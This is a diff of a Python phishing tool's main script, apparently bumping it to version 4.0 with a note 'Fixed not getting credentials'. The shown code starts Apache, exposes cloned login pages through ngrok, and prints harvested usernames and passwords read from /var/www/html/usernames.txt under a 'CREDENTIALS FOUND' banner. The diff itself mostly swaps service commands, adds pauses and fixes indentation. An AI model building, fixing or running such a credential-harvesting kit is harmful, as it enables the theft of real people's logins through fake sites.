@@ -3,12 +3,10 @@
 
 
 ##################################################################
-## You may change the code however you want                    ##
 ## Create pull requests to support the tool                    ##
 ## Create an issue if you find any problems or ideas           ##
-## Lasted Updated: 2/16/20                                     ##
-## Version 3.8: - Fixed Snapchat                               ##
-## Please update version number and date each time we update   ##
+## Lasted Updated: 5/1/21                                      ##
+## Version 4.0: - Fixed not getting credentials                ##
 #################################################################
 
 
@@ -83,11 +81,11 @@ def warning(): # Banner #
     if warningchoice == 'y':
         pass
     elif warningchoice == 'yes':
-	    pass
+        pass
     elif warningchoice == 'Y':
         pass
     elif warningchoice == 'Yes':
-	    pass
+        pass
     else:
         endMessage()
 
@@ -96,7 +94,7 @@ def warning(): # Banner #
 def checkInternet(): # Checks for internet connection #
     print(yellow + "[*] Checking connection...")
     try:
-        create_connection(("www.apple.com", 80)) # Tries to connect to google.com #
+        create_connection(("www.github.com", 80)) # Tries to connect to github.com #
         print(green + "[+] Internet Found")
         sleep(2)
     except OSError: # Checks for OSError #
@@ -135,7 +133,7 @@ def setup(template): # Template for input #
         sleep(0.1)
         print(yellow + '[+] Starting Apache2 Service')
         sleep(0.1)
-        system('service apache2 start')  # Starts apache2 service #
+        system('sudo systemctl restart apache2')  # Starts apache2 service #
         print(green + '[+] Apache2 Service Started')
         sleep(0.1)
         print(blue + "\nLocal: " + red + localip + "\n")  # Shows where site is hosted locally #
@@ -148,6 +146,7 @@ def setup(template): # Template for input #
             with open('/var/www/html/usernames.txt') as creds:
                 lines = creds.read().rstrip()
                 if len(lines) != 0:
+                    sleep(1)
                     print(green + "______________________________________________________________________________\n")
                     print('\n                CREDENTIALS FOUND\n\n')
                     system("cat /var/www/html/usernames.txt")
@@ -175,7 +174,7 @@ def setup(template): # Template for input #
         sleep(0.1)
         print(yellow + '[+] Starting Apache2 Service')
         sleep(0.1)
-        system('service apache2 start')  # Starts apache2 service #
+        system('sudo systemctl restart apache2')  # Starts apache2 service #
         print(green + '[+] Apache2 Service Started')
         sleep(0.1)
         print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
@@ -188,6 +187,7 @@ def setup(template): # Template for input #
             with open('/var/www/html/usernames.txt') as creds:
                 lines = creds.read().rstrip()
                 if len(lines) != 0:
+                    sleep(1)
                     print(green + "______________________________________________________________________________\n")
                     print('\n                CREDENTIALS FOUND\n\n')
                     system("cat /var/www/html/usernames.txt")
@@ -215,7 +215,7 @@ def setup(template): # Template for input #
         sleep(0.1)
         print(yellow + '[+] Starting Apache2 Service')
         sleep(0.1)
-        system('service apache2 start')  # Starts apache2 service #
+        system('sudo systemctl restart apache2')  # Starts apache2 service #
         print(green + '[+] Apache2 Service Started')
         sleep(0.1)
         print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
@@ -226,6 +226,7 @@ def setup(template): # Template for input #
             with open('/var/www/html/usernames.txt') as creds:
                 lines = creds.read().rstrip()
                 if len(lines) != 0:
+                    sleep(1)
                     print(green + "______________________________________________________________________________\n")
                     print('\n                CREDENTIALS FOUND\n\n')
                     system("cat /var/www/html/usernames.txt")
@@ -253,7 +254,7 @@ def setup(template): # Template for input #
         sleep(0.1)
         print(yellow + '[+] Starting Apache2 Service')
         sleep(0.1)
-        system('service apache2 start')  # Starts apache2 service #
+        system('sudo systemctl restart apache2')  # Starts apache2 service #
         print(green + '[+] Apache2 Service Started')
         sleep(0.1)
         print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
@@ -264,6 +265,7 @@ def setup(template): # Template for input #
             with open('/var/www/html/usernames.txt') as creds:
                 lines = creds.read().rstrip()
                 if len(lines) != 0:
+                    sleep(1)
                     print(green + "______________________________________________________________________________\n")
                     print('\n                CREDENTIALS FOUND\n\n')
                     system("cat /var/www/html/usernames.txt")
@@ -341,7 +343,7 @@ def banner():
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.4
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v4.0
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -426,7 +428,7 @@ def main():
     # Clean out everything #
     elif choice == "0":
         print(green + '[+] Stopping Apache2 Service')
-        system('service apache2 stop') # Stops apache2 service #
+        system('sudo systemctl stop apache2') # Stops apache2 service #
         print(green + '[+] Stopping Traffic forwarding to ngrok')
         system('pkill -f ngrok') # Stops ngrok #
         print(green + '[+] Cleaning /var/www/html/')
